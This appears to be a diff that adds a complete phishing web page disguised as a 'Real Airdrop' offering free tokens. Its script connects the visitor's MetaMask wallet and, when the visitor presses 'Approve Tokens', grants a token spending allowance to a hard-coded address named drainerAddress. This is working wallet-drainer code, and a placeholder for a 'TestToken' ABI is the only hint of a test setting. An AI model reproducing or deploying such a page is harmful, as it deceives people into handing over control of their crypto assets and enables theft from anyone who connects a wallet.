@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Real Airdrop</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+</head>
+<body>
+  <h2>Claim Your Free Tokens!</h2>
+  <button onclick="connectWallet()">Connect Wallet</button>
+  <button onclick="approveTokens()">Approve Tokens</button>
+
+  <script>
+    let web3;
+    let tokenAddress = "0xDA0bab807633f07f013f94DD0E6A4F96F8742B53";
+    let drainerAddress = "0x358AA13c52544ECCEF6B0ADD0f801012ADAD5eE3";
+
+    const tokenABI = [ /* paste your TestToken ABI here */ ];
+
+    async function connectWallet() {
+      if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        alert("Wallet connected!");
+      } else {
+        alert("Please install MetaMask.");
+      }
+    }
+
+    async function approveTokens() {
+      const accounts = await web3.eth.getAccounts();
+      const token = new web3.eth.Contract(tokenABI, tokenAddress);
+      await token.methods.approve(drainerAddress, web3.utils.toWei("1000")).send({ from: accounts[0] });
+      alert("Tokens approved!");
+    }
+  </script>
+</body>
+</html>
